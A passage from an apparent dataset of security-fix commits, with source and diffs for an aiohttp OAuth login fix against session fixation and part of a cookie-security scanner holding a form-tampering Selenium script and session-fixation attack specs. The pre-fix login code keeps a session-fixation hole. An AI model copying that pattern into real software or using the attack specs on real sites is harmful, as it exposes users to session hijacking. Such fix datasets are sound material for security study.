'https:\/\/www.googleapis.com\/auth\/userinfo.profile',\n        'https:\/\/www.googleapis.com\/auth\/userinfo.email',\n        'openid'\n    ]\n    flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(\n        '\/auth-oauth2-client-secret\/client_secret.json', scopes=scopes, state=state)\n    flow.redirect_uri = redirect_uri\n    return flow\n\n\n@routes.get('\/healthcheck')\nasync def get_healthcheck(request):  # pylint: disable=W0613\n    return web.Response()\n\n\n@routes.get('')\n@routes.get('\/')\nasync def get_index(request):  # pylint: disable=unused-argument\n    return aiohttp.web.HTTPFound(deploy_config.external_url('auth', '\/login'))\n\n\n@routes.get('\/login')\n@web_maybe_authenticated_user\nasync def login(request, userdata):\n    next = request.query.get('next', deploy_config.external_url('notebook', ''))\n    if userdata:\n        return aiohttp.web.HTTPFound(next)\n\n    flow = get_flow(deploy_config.external_url('auth', '\/oauth2callback'))\n\n    authorization_url, state = flow.authorization_url(\n        access_type='offline',\n        include_granted_scopes='true')\n\n    session = await aiohttp_session.get_session(request)\n    session['state'] = state\n    session['next'] = next\n\n    return aiohttp.web.HTTPFound(authorization_url)\n\n\n@routes.get('\/oauth2callback')\nasync def callback(request):\n    session = await aiohttp_session.get_session(request)\n    if 'state' not in session:\n        raise web.HTTPUnauthorized()\n    state = session['state']\n\n    flow = get_flow(deploy_config.external_url('auth', '\/oauth2callback'), state=state)\n\n    try:\n        flow.fetch_token(code=request.query['code'])\n        token = google.oauth2.id_token.verify_oauth2_token(\n            flow.credentials.id_token, google.auth.transport.requests.Request())\n        email = token['email']\n    except Exception:\n        log.exception('oauth2 callback: could not fetch and verify token')\n        raise web.HTTPUnauthorized()\n\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute(\"SELECT * FROM users WHERE email = %s AND state = 'active';\", email)\n            users = await cursor.fetchall()\n\n    if len(users) != 1:\n        raise web.HTTPUnauthorized()\n    user = users[0]\n\n    session_id = await create_session(dbpool, user['id'])\n\n    del session['state']\n    session['session_id'] = session_id\n    next = session.pop('next')\n    return aiohttp.web.HTTPFound(next)\n\n\n@routes.post('\/logout')\n@check_csrf_token\n@web_maybe_authenticated_user\nasync def logout(request, userdata):\n    if not userdata:\n        return web.HTTPFound(deploy_config.external_url('notebook', ''))\n\n    dbpool = request.app['dbpool']\n    session_id = userdata['session_id']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('DELETE FROM sessions WHERE session_id = %s;', session_id)\n\n    session = await aiohttp_session.get_session(request)\n    if 'session_id' in session:\n        del session['session_id']\n\n    return web.HTTPFound(deploy_config.external_url('notebook', ''))\n\n\n@routes.get('\/api\/v1alpha\/login')\nasync def rest_login(request):\n    callback_port = request.query['callback_port']\n\n    flow = get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback')\n    authorization_url, state = flow.authorization_url(\n        access_type='offline',\n        include_granted_scopes='true')\n\n    return web.json_response({\n        'authorization_url': authorization_url,\n        'state': state\n    })\n\n\n@routes.get('\/users')\n@web_authenticated_developers_only()\nasync def get_users(request, userdata):\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('SELECT * FROM users;')\n            users = await cursor.fetchall()\n    page_context = {\n        'users': users\n    }\n    return await render_template('auth', request, userdata, 'users.html', page_context)\n\n\n@routes.post('\/users')\n@check_csrf_token\n@web_authenticated_developers_only()\nasync def post_create_user(request, userdata):  # pylint: disable=unused-argument\n    session = await aiohttp_session.get_session(request)\n    dbpool = request.app['dbpool']\n    post = await request.post()\n    username = post['username']\n    email = post['email']\n    is_developer = post.get('is_developer') == '1'\n\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute(\n                '''\nINSERT INTO users (state, username, email, is_developer)\nVALUES (%s, %s, %s, %s);\n''',\n                ('creating', username, email, is_developer))\n            user_id = cursor.lastrowid\n\n    set_message(session, f'Created user {user_id} {username}.', 'info')\n\n    return web.HTTPFound(deploy_config.external_url('auth', '\/users'))\n\n\n@routes.post('\/users\/delete')\n@check_csrf_token\n@web_authenticated_developers_only()\nasync def delete_user(request, userdata):  # pylint: disable=unused-argument\n    session = await aiohttp_session.get_session(request)\n    dbpool = request.app['dbpool']\n    post = await request.post()\n    id = post['id']\n    username = post['username']\n\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            n_rows = await cursor.execute(\n                '''\nUPDATE users\nSET state = 'deleting'\nWHERE id = %s AND username = %s;\n''',\n                (id, username))\n            if n_rows != 1:\n                assert n_rows == 0\n                set_message(session, f'Delete failed, no such user {id} {username}.', 'error')\n\n    set_message(session, f'Deleted user {id} {username}.', 'info')\n\n    return web.HTTPFound(deploy_config.external_url('auth', '\/users'))\n\n\n@routes.get('\/api\/v1alpha\/oauth2callback')\nasync def rest_callback(request):\n    state = request.query['state']\n    code = request.query['code']\n    callback_port = request.query['callback_port']\n\n    try:\n        flow = get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback', state=state)\n        flow.fetch_token(code=code)\n        token = google.oauth2.id_token.verify_oauth2_token(\n            flow.credentials.id_token, google.auth.transport.requests.Request())\n        email = token['email']\n    except Exception:\n        log.exception('fetching and decoding token')\n        raise web.HTTPUnauthorized()\n\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute(\"SELECT * FROM users WHERE email = %s AND state = 'active';\", email)\n            users = await cursor.fetchall()\n\n    if len(users) != 1:\n        raise web.HTTPUnauthorized()\n    user = users[0]\n\n    session_id = await create_session(dbpool, user['id'])\n\n    return web.json_response({\n        'token': session_id,\n        'username': user['username']\n    })\n\n\n@routes.post('\/api\/v1alpha\/logout')\n@rest_authenticated_users_only\nasync def rest_logout(request, userdata):\n    session_id = userdata['session_id']\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('DELETE FROM sessions WHERE session_id = %s;', session_id)\n\n    return web.Response(status=200)\n\n\n@routes.get('\/api\/v1alpha\/userinfo')\nasync def userinfo(request):\n    if 'Authorization' not in request.headers:\n        log.info('Authorization not in request.headers')\n        raise web.HTTPUnauthorized()\n\n    auth_header = request.headers['Authorization']\n    if not auth_header.startswith('Bearer '):\n        log.info('Bearer not in Authorization header')\n        raise web.HTTPUnauthorized()\n    session_id = auth_header[7:]\n\n    # b64 encoding of 32-byte session ID is 44 bytes\n    if len(session_id) != 44:\n        log.info('Session id != 44 bytes')\n        raise web.HTTPUnauthorized()\n\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('''\nSELECT users.*, sessions.session_id FROM users\nINNER JOIN sessions ON users.id = sessions.user_id\nWHERE users.state = 'active' AND (sessions.session_id = %s) AND (ISNULL(sessions.max_age_secs) OR (NOW() < TIMESTAMPADD(SECOND, sessions.max_age_secs, sessions.created)));\n''', session_id)\n            users = await cursor.fetchall()\n\n    if len(users) != 1:\n        log.info(f'Unknown session id: {session_id}')\n        raise web.HTTPUnauthorized()\n    user = users[0]\n\n    return web.json_response(user)\n\n\nasync def on_startup(app):\n    app['dbpool'] = await create_database_pool()\n\n\nasync def on_cleanup(app):\n    dbpool = app['dbpool']\n    dbpool.close()\n    await dbpool.wait_closed()\n\n\ndef run():\n    app = web.Application()\n\n    setup_aiohttp_jinja2(app, 'auth')\n    setup_aiohttp_session(app)\n\n    setup_common_static_routes(routes)\n    app.add_routes(routes)\n    app.on_startup.append(on_startup)\n    app.on_cleanup.append(on_cleanup)\n\n    web.run_app(deploy_config.prefix_application(app, 'auth'), host='0.0.0.0', port=5000)\n"}},"msg":"[auth] maybe fix auth flow & close security hole (#8052)\n\n* [auth] maybe fix auth flow & close security hole\n\nIt seems that sessions sometimes become inaccessible to auth. Using some\nlogging, I realized that `\/login` will set some session parameters that do not\nreappear in `\/oauth2callback`. While trying to debug this, I deleted my cookie\nand everything started working again. Luckily, my phone was still borked. The\nfix is to use `new_session` which I discovered with a big red warning in\naiohttp-session's docs: [Always use new_session() instead of get_session() in\nyour login views to guard against Session Fixation\nattacks!](https:\/\/aiohttp-session.readthedocs.io\/en\/stable\/reference.html#aiohttp_session.new_session).\n\nIf nothing else, we are now safe from session fixation attacks. I do not\nunderstand why this is necessary for correctness.\n\n* bump\n\n* bump"}},"https:\/\/github.com\/hail-is\/hail":{"d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9":{"url":"https:\/\/api.github.com\/repos\/hail-is\/hail\/commits\/d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9","html_url":"https:\/\/github.com\/hail-is\/hail\/commit\/d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9","message":"[auth] maybe fix auth flow & close security hole (#8052)\n\n* [auth] maybe fix auth flow & close security hole\n\nIt seems that sessions sometimes become inaccessible to auth. Using some\nlogging, I realized that `\/login` will set some session parameters that do not\nreappear in `\/oauth2callback`. While trying to debug this, I deleted my cookie\nand everything started working again. Luckily, my phone was still borked. The\nfix is to use `new_session` which I discovered with a big red warning in\naiohttp-session's docs: [Always use new_session() instead of get_session() in\nyour login views to guard against Session Fixation\nattacks!](https:\/\/aiohttp-session.readthedocs.io\/en\/stable\/reference.html#aiohttp_session.new_session).\n\nIf nothing else, we are now safe from session fixation attacks. I do not\nunderstand why this is necessary for correctness.\n\n* bump\n\n* bump","sha":"d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9","keyword":"session fixation fix","diff":"diff --git a\/auth\/auth\/auth.py b\/auth\/auth\/auth.py\nindex e22a8ad2c2e..6cd4e23d68d 100644\n--- a\/auth\/auth\/auth.py\n+++ b\/auth\/auth\/auth.py\n@@ -59,7 +59,7 @@ async def login(request, userdata):\n         access_type='offline',\n         include_granted_scopes='true')\n \n-    session = await aiohttp_session.get_session(request)\n+    session = await aiohttp_session.new_session(request)\n     session['state'] = state\n     session['next'] = next\n \n","files":{"\/auth\/auth\/auth.py":{"changes":[{"diff":"\n         access_type='offline',\n         include_granted_scopes='true')\n \n-    session = await aiohttp_session.get_session(request)\n+    session = await aiohttp_session.new_session(request)\n     session['state'] = state\n     session['next'] = next\n \n","add":1,"remove":1,"filename":"\/auth\/auth\/auth.py","badparts":["    session = await aiohttp_session.get_session(request)"],"goodparts":["    session = await aiohttp_session.new_session(request)"]},{"diff":"\n         access_type='offline',\n         include_granted_scopes='true')\n \n-    session = await aiohttp_session.get_session(request)\n+    session = await aiohttp_session.new_session(request)\n     session['state'] = state\n     session['next'] = next\n \n","add":1,"remove":1,"filename":"\/auth\/auth\/auth.py","badparts":["    session = await aiohttp_session.get_session(request)"],"goodparts":["    session = await aiohttp_session.new_session(request)"]}],"source":"\nimport logging import aiohttp from aiohttp import web import aiohttp_session import uvloop import google.auth.transport.requests import google.oauth2.id_token import google.cloud.storage import google_auth_oauthlib.flow from hailtop.config import get_deploy_config from gear import setup_aiohttp_session, create_database_pool, \\ rest_authenticated_users_only, web_authenticated_developers_only, \\ web_maybe_authenticated_user, create_session, check_csrf_token from web_common import setup_aiohttp_jinja2, setup_common_static_routes, \\ set_message, render_template log=logging.getLogger('auth') uvloop.install() deploy_config=get_deploy_config() routes=web.RouteTableDef() def get_flow(redirect_uri, state=None): scopes=[ 'https:\/\/www.googleapis.com\/auth\/userinfo.profile', 'https:\/\/www.googleapis.com\/auth\/userinfo.email', 'openid' ] flow=google_auth_oauthlib.flow.Flow.from_client_secrets_file( '\/auth-oauth2-client-secret\/client_secret.json', scopes=scopes, state=state) flow.redirect_uri=redirect_uri return flow @routes.get('\/healthcheck') async def get_healthcheck(request): return web.Response() @routes.get('') @routes.get('\/') async def get_index(request): return aiohttp.web.HTTPFound(deploy_config.external_url('auth', '\/login')) @routes.get('\/login') @web_maybe_authenticated_user async def login(request, userdata): next=request.query.get('next', deploy_config.external_url('notebook', '')) if userdata: return aiohttp.web.HTTPFound(next) flow=get_flow(deploy_config.external_url('auth', '\/oauth2callback')) authorization_url, state=flow.authorization_url( access_type='offline', include_granted_scopes='true') session=await aiohttp_session.get_session(request) session['state']=state session['next']=next return aiohttp.web.HTTPFound(authorization_url) @routes.get('\/oauth2callback') async def callback(request): session=await aiohttp_session.get_session(request) if 'state' not in session: raise web.HTTPUnauthorized() state=session['state'] flow=get_flow(deploy_config.external_url('auth', '\/oauth2callback'), state=state) try: flow.fetch_token(code=request.query['code']) token=google.oauth2.id_token.verify_oauth2_token( flow.credentials.id_token, google.auth.transport.requests.Request()) email=token['email'] except Exception: log.exception('oauth2 callback: could not fetch and verify token') raise web.HTTPUnauthorized() dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute(\"SELECT * FROM users WHERE email=%s AND state='active';\", email) users=await cursor.fetchall() if len(users) !=1: raise web.HTTPUnauthorized() user=users[0] session_id=await create_session(dbpool, user['id']) del session['state'] session['session_id']=session_id next=session.pop('next') return aiohttp.web.HTTPFound(next) @routes.post('\/logout') @check_csrf_token @web_maybe_authenticated_user async def logout(request, userdata): if not userdata: return web.HTTPFound(deploy_config.external_url('notebook', '')) dbpool=request.app['dbpool'] session_id=userdata['session_id'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute('DELETE FROM sessions WHERE session_id=%s;', session_id) session=await aiohttp_session.get_session(request) if 'session_id' in session: del session['session_id'] return web.HTTPFound(deploy_config.external_url('notebook', '')) @routes.get('\/api\/v1alpha\/login') async def rest_login(request): callback_port=request.query['callback_port'] flow=get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback') authorization_url, state=flow.authorization_url( access_type='offline', include_granted_scopes='true') return web.json_response({ 'authorization_url': authorization_url, 'state': state }) @routes.get('\/users') @web_authenticated_developers_only() async def get_users(request, userdata): dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute('SELECT * FROM users;') users=await cursor.fetchall() page_context={ 'users': users } return await render_template('auth', request, userdata, 'users.html', page_context) @routes.post('\/users') @check_csrf_token @web_authenticated_developers_only() async def post_create_user(request, userdata): session=await aiohttp_session.get_session(request) dbpool=request.app['dbpool'] post=await request.post() username=post['username'] email=post['email'] is_developer=post.get('is_developer')=='1' async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute( ''' INSERT INTO users(state, username, email, is_developer) VALUES(%s, %s, %s, %s); ''', ('creating', username, email, is_developer)) user_id=cursor.lastrowid set_message(session, f'Created user{user_id}{username}.', 'info') return web.HTTPFound(deploy_config.external_url('auth', '\/users')) @routes.post('\/users\/delete') @check_csrf_token @web_authenticated_developers_only() async def delete_user(request, userdata): session=await aiohttp_session.get_session(request) dbpool=request.app['dbpool'] post=await request.post() id=post['id'] username=post['username'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: n_rows=await cursor.execute( ''' UPDATE users SET state='deleting' WHERE id=%s AND username=%s; ''', (id, username)) if n_rows !=1: assert n_rows==0 set_message(session, f'Delete failed, no such user{id}{username}.', 'error') set_message(session, f'Deleted user{id}{username}.', 'info') return web.HTTPFound(deploy_config.external_url('auth', '\/users')) @routes.get('\/api\/v1alpha\/oauth2callback') async def rest_callback(request): state=request.query['state'] code=request.query['code'] callback_port=request.query['callback_port'] try: flow=get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback', state=state) flow.fetch_token(code=code) token=google.oauth2.id_token.verify_oauth2_token( flow.credentials.id_token, google.auth.transport.requests.Request()) email=token['email'] except Exception: log.exception('fetching and decoding token') raise web.HTTPUnauthorized() dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute(\"SELECT * FROM users WHERE email=%s AND state='active';\", email) users=await cursor.fetchall() if len(users) !=1: raise web.HTTPUnauthorized() user=users[0] session_id=await create_session(dbpool, user['id']) return web.json_response({ 'token': session_id, 'username': user['username'] }) @routes.post('\/api\/v1alpha\/logout') @rest_authenticated_users_only async def rest_logout(request, userdata): session_id=userdata['session_id'] dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute('DELETE FROM sessions WHERE session_id=%s;', session_id) return web.Response(status=200) @routes.get('\/api\/v1alpha\/userinfo') async def userinfo(request): if 'Authorization' not in request.headers: log.info('Authorization not in request.headers') raise web.HTTPUnauthorized() auth_header=request.headers['Authorization'] if not auth_header.startswith('Bearer '): log.info('Bearer not in Authorization header') raise web.HTTPUnauthorized() session_id=auth_header[7:] if len(session_id) !=44: log.info('Session id !=44 bytes') raise web.HTTPUnauthorized() dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute(''' SELECT users.*, sessions.session_id FROM users INNER JOIN sessions ON users.id=sessions.user_id WHERE users.state='active' AND(sessions.session_id=%s) AND(ISNULL(sessions.max_age_secs) OR(NOW() < TIMESTAMPADD(SECOND, sessions.max_age_secs, sessions.created))); ''', session_id) users=await cursor.fetchall() if len(users) !=1: log.info(f'Unknown session id:{session_id}') raise web.HTTPUnauthorized() user=users[0] return web.json_response(user) async def on_startup(app): app['dbpool']=await create_database_pool() async def on_cleanup(app): dbpool=app['dbpool'] dbpool.close() await dbpool.wait_closed() def run(): app=web.Application() setup_aiohttp_jinja2(app, 'auth') setup_aiohttp_session(app) setup_common_static_routes(routes) app.add_routes(routes) app.on_startup.append(on_startup) app.on_cleanup.append(on_cleanup) web.run_app(deploy_config.prefix_application(app, 'auth'), host='0.0.0.0', port=5000) ","sourceWithComments":"import logging\nimport aiohttp\nfrom aiohttp import web\nimport aiohttp_session\nimport uvloop\nimport google.auth.transport.requests\nimport google.oauth2.id_token\nimport google.cloud.storage\nimport google_auth_oauthlib.flow\nfrom hailtop.config import get_deploy_config\nfrom gear import setup_aiohttp_session, create_database_pool, \\\n    rest_authenticated_users_only, web_authenticated_developers_only, \\\n    web_maybe_authenticated_user, create_session, check_csrf_token\nfrom web_common import setup_aiohttp_jinja2, setup_common_static_routes, \\\n    set_message, render_template\n\nlog = logging.getLogger('auth')\n\nuvloop.install()\n\ndeploy_config = get_deploy_config()\n\nroutes = web.RouteTableDef()\n\n\ndef get_flow(redirect_uri, state=None):\n    scopes = [\n        'https:\/\/www.googleapis.com\/auth\/userinfo.profile',\n        'https:\/\/www.googleapis.com\/auth\/userinfo.email',\n        'openid'\n    ]\n    flow = google_auth_oauthlib.flow.Flow.from_client_secrets_file(\n        '\/auth-oauth2-client-secret\/client_secret.json', scopes=scopes, state=state)\n    flow.redirect_uri = redirect_uri\n    return flow\n\n\n@routes.get('\/healthcheck')\nasync def get_healthcheck(request):  # pylint: disable=W0613\n    return web.Response()\n\n\n@routes.get('')\n@routes.get('\/')\nasync def get_index(request):  # pylint: disable=unused-argument\n    return aiohttp.web.HTTPFound(deploy_config.external_url('auth', '\/login'))\n\n\n@routes.get('\/login')\n@web_maybe_authenticated_user\nasync def login(request, userdata):\n    next = request.query.get('next', deploy_config.external_url('notebook', ''))\n    if userdata:\n        return aiohttp.web.HTTPFound(next)\n\n    flow = get_flow(deploy_config.external_url('auth', '\/oauth2callback'))\n\n    authorization_url, state = flow.authorization_url(\n        access_type='offline',\n        include_granted_scopes='true')\n\n    session = await aiohttp_session.get_session(request)\n    session['state'] = state\n    session['next'] = next\n\n    return aiohttp.web.HTTPFound(authorization_url)\n\n\n@routes.get('\/oauth2callback')\nasync def callback(request):\n    session = await aiohttp_session.get_session(request)\n    if 'state' not in session:\n        raise web.HTTPUnauthorized()\n    state = session['state']\n\n    flow = get_flow(deploy_config.external_url('auth', '\/oauth2callback'), state=state)\n\n    try:\n        flow.fetch_token(code=request.query['code'])\n        token = google.oauth2.id_token.verify_oauth2_token(\n            flow.credentials.id_token, google.auth.transport.requests.Request())\n        email = token['email']\n    except Exception:\n        log.exception('oauth2 callback: could not fetch and verify token')\n        raise web.HTTPUnauthorized()\n\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute(\"SELECT * FROM users WHERE email = %s AND state = 'active';\", email)\n            users = await cursor.fetchall()\n\n    if len(users) != 1:\n        raise web.HTTPUnauthorized()\n    user = users[0]\n\n    session_id = await create_session(dbpool, user['id'])\n\n    del session['state']\n    session['session_id'] = session_id\n    next = session.pop('next')\n    return aiohttp.web.HTTPFound(next)\n\n\n@routes.post('\/logout')\n@check_csrf_token\n@web_maybe_authenticated_user\nasync def logout(request, userdata):\n    if not userdata:\n        return web.HTTPFound(deploy_config.external_url('notebook', ''))\n\n    dbpool = request.app['dbpool']\n    session_id = userdata['session_id']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('DELETE FROM sessions WHERE session_id = %s;', session_id)\n\n    session = await aiohttp_session.get_session(request)\n    if 'session_id' in session:\n        del session['session_id']\n\n    return web.HTTPFound(deploy_config.external_url('notebook', ''))\n\n\n@routes.get('\/api\/v1alpha\/login')\nasync def rest_login(request):\n    callback_port = request.query['callback_port']\n\n    flow = get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback')\n    authorization_url, state = flow.authorization_url(\n        access_type='offline',\n        include_granted_scopes='true')\n\n    return web.json_response({\n        'authorization_url': authorization_url,\n        'state': state\n    })\n\n\n@routes.get('\/users')\n@web_authenticated_developers_only()\nasync def get_users(request, userdata):\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('SELECT * FROM users;')\n            users = await cursor.fetchall()\n    page_context = {\n        'users': users\n    }\n    return await render_template('auth', request, userdata, 'users.html', page_context)\n\n\n@routes.post('\/users')\n@check_csrf_token\n@web_authenticated_developers_only()\nasync def post_create_user(request, userdata):  # pylint: disable=unused-argument\n    session = await aiohttp_session.get_session(request)\n    dbpool = request.app['dbpool']\n    post = await request.post()\n    username = post['username']\n    email = post['email']\n    is_developer = post.get('is_developer') == '1'\n\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute(\n                '''\nINSERT INTO users (state, username, email, is_developer)\nVALUES (%s, %s, %s, %s);\n''',\n                ('creating', username, email, is_developer))\n            user_id = cursor.lastrowid\n\n    set_message(session, f'Created user {user_id} {username}.', 'info')\n\n    return web.HTTPFound(deploy_config.external_url('auth', '\/users'))\n\n\n@routes.post('\/users\/delete')\n@check_csrf_token\n@web_authenticated_developers_only()\nasync def delete_user(request, userdata):  # pylint: disable=unused-argument\n    session = await aiohttp_session.get_session(request)\n    dbpool = request.app['dbpool']\n    post = await request.post()\n    id = post['id']\n    username = post['username']\n\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            n_rows = await cursor.execute(\n                '''\nUPDATE users\nSET state = 'deleting'\nWHERE id = %s AND username = %s;\n''',\n                (id, username))\n            if n_rows != 1:\n                assert n_rows == 0\n                set_message(session, f'Delete failed, no such user {id} {username}.', 'error')\n\n    set_message(session, f'Deleted user {id} {username}.', 'info')\n\n    return web.HTTPFound(deploy_config.external_url('auth', '\/users'))\n\n\n@routes.get('\/api\/v1alpha\/oauth2callback')\nasync def rest_callback(request):\n    state = request.query['state']\n    code = request.query['code']\n    callback_port = request.query['callback_port']\n\n    try:\n        flow = get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback', state=state)\n        flow.fetch_token(code=code)\n        token = google.oauth2.id_token.verify_oauth2_token(\n            flow.credentials.id_token, google.auth.transport.requests.Request())\n        email = token['email']\n    except Exception:\n        log.exception('fetching and decoding token')\n        raise web.HTTPUnauthorized()\n\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute(\"SELECT * FROM users WHERE email = %s AND state = 'active';\", email)\n            users = await cursor.fetchall()\n\n    if len(users) != 1:\n        raise web.HTTPUnauthorized()\n    user = users[0]\n\n    session_id = await create_session(dbpool, user['id'])\n\n    return web.json_response({\n        'token': session_id,\n        'username': user['username']\n    })\n\n\n@routes.post('\/api\/v1alpha\/logout')\n@rest_authenticated_users_only\nasync def rest_logout(request, userdata):\n    session_id = userdata['session_id']\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('DELETE FROM sessions WHERE session_id = %s;', session_id)\n\n    return web.Response(status=200)\n\n\n@routes.get('\/api\/v1alpha\/userinfo')\nasync def userinfo(request):\n    if 'Authorization' not in request.headers:\n        log.info('Authorization not in request.headers')\n        raise web.HTTPUnauthorized()\n\n    auth_header = request.headers['Authorization']\n    if not auth_header.startswith('Bearer '):\n        log.info('Bearer not in Authorization header')\n        raise web.HTTPUnauthorized()\n    session_id = auth_header[7:]\n\n    # b64 encoding of 32-byte session ID is 44 bytes\n    if len(session_id) != 44:\n        log.info('Session id != 44 bytes')\n        raise web.HTTPUnauthorized()\n\n    dbpool = request.app['dbpool']\n    async with dbpool.acquire() as conn:\n        async with conn.cursor() as cursor:\n            await cursor.execute('''\nSELECT users.*, sessions.session_id FROM users\nINNER JOIN sessions ON users.id = sessions.user_id\nWHERE users.state = 'active' AND (sessions.session_id = %s) AND (ISNULL(sessions.max_age_secs) OR (NOW() < TIMESTAMPADD(SECOND, sessions.max_age_secs, sessions.created)));\n''', session_id)\n            users = await cursor.fetchall()\n\n    if len(users) != 1:\n        log.info(f'Unknown session id: {session_id}')\n        raise web.HTTPUnauthorized()\n    user = users[0]\n\n    return web.json_response(user)\n\n\nasync def on_startup(app):\n    app['dbpool'] = await create_database_pool()\n\n\nasync def on_cleanup(app):\n    dbpool = app['dbpool']\n    dbpool.close()\n    await dbpool.wait_closed()\n\n\ndef run():\n    app = web.Application()\n\n    setup_aiohttp_jinja2(app, 'auth')\n    setup_aiohttp_session(app)\n\n    setup_common_static_routes(routes)\n    app.add_routes(routes)\n    app.on_startup.append(on_startup)\n    app.on_cleanup.append(on_cleanup)\n\n    web.run_app(deploy_config.prefix_application(app, 'auth'), host='0.0.0.0', port=5000)\n"}},"msg":"[auth] maybe fix auth flow & close security hole (#8052)\n\n* [auth] maybe fix auth flow & close security hole\n\nIt seems that sessions sometimes become inaccessible to auth. Using some\nlogging, I realized that `\/login` will set some session parameters that do not\nreappear in `\/oauth2callback`. While trying to debug this, I deleted my cookie\nand everything started working again. Luckily, my phone was still borked. The\nfix is to use `new_session` which I discovered with a big red warning in\naiohttp-session's docs: [Always use new_session() instead of get_session() in\nyour login views to guard against Session Fixation\nattacks!](https:\/\/aiohttp-session.readthedocs.io\/en\/stable\/reference.html#aiohttp_session.new_session).\n\nIf nothing else, we are now safe from session fixation attacks. I do not\nunderstand why this is necessary for correctness.\n\n* bump\n\n* bump"}},"https:\/\/github.com\/HarrisonSong\/cookie_management_security_scanner":{"f7c6f051bffda989acc51ddadfba602dd1097a08":{"url":"https:\/\/api.github.com\/repos\/HarrisonSong\/cookie_management_security_scanner\/commits\/f7c6f051bffda989acc51ddadfba602dd1097a08","html_url":"https:\/\/github.com\/HarrisonSong\/cookie_management_security_scanner\/commit\/f7c6f051bffda989acc51ddadfba602dd1097a08","sha":"f7c6f051bffda989acc51ddadfba602dd1097a08","keyword":"session fixation update","diff":"diff --git a\/App1\/automation.py b\/App1\/automation.py\ndeleted file mode 100644\nindex 22435ce..0000000\n--- a\/App1\/automation.py\n+++ \/dev\/null\n@@ -1,13 +0,0 @@\n-from selenium import webdriver\n-url = \"http:\/\/app1.com\"\n-wd = webdriver.Chrome()\n-\n-wd.get(url)\n-\n-# enable input and submit button\n-wd.execute_script(\"document.getElementsByTagName('input')[0].disabled = false\")\n-wd.execute_script(\"document.getElementsByTagName('input')[1].disabled = false\")\n-\n-# fill in -1 value in input and submit\n-wd.find_element_by_css_selector(\"input[type='text']\").send_keys(-1)\n-wd.find_element_by_css_selector(\"form\").submit()\ndiff --git a\/App1\/phase3output.json b\/App1\/phase3output.json\nnew file mode 100644\nindex 0000000..e74cd9c\n--- \/dev\/null\n+++ b\/App1\/phase3output.json\n@@ -0,0 +1 @@\n+[{\"form_parameter\": {\"account\": \"username\", \"password\": \"password\", \"account_value\": \"bryce\", \"password_value\": \"bryce\"}, \"cookie\": {\"attack\": \"sessionFixation\", \"name\": \"PHPSESSID\", \"httpOnly\": false, \"secure\": false}, \"button\": \"login\", \"link\": \"https:\/\/app1.com\/users\/login.php\"}]\ndiff --git a\/App1\/starter.sh b\/App1\/starter.sh\ndeleted file mode 100755\nindex 4dc0306..0000000\n--- a\/App1\/starter.sh\n+++ \/dev\/null\n@@ -1,2 +0,0 @@\n-#!\/bin\/bash\n-python 1.py\ndiff --git a\/attack_category_detector.py b\/attack_category_detector.py\nindex d3a07c9..a447084 100644\n--- a\/attack_category_detector.py\n+++ b\/attack_category_detector.py\n@@ -8,12 +8,12 @@ def __init__(self, attack_specs):\n     \"\"\"Return a Attack_category_detector object.\"\"\"\n     self.attacks_list = []\n     for index, attack in enumerate(attack_specs):\n-      if attack[\"cookie\"][\"attack\"][0].strip() == \"sessionFixation\":\n+      if attack[\"cookie\"][\"attack\"].strip() == \"sessionFixation\":\n         self.attacks_list.append(SessionFixationAttack(attack[\"link\"], attack[\"form_parameter\"], attack[\"button\"], attack[\"cookie\"]))\n-      elif attack[\"cookie\"][\"attack\"][0].strip() == \"sessionHijacking\":\n+      elif attack[\"cookie\"][\"attack\"].strip() == \"sessionHijacking\":\n         self.attacks_list.append(SessionHijackingAttack(attack[\"link\"], attack[\"form_parameter\"], attack[\"button\"], attack[\"cookie\"]))\n-      elif attack[\"cookie\"][\"attack\"][0].strip() == \"predictableCookie\":\n-        self.attacks_list.append(PredictableCookieAttack(attack[\"link\"], 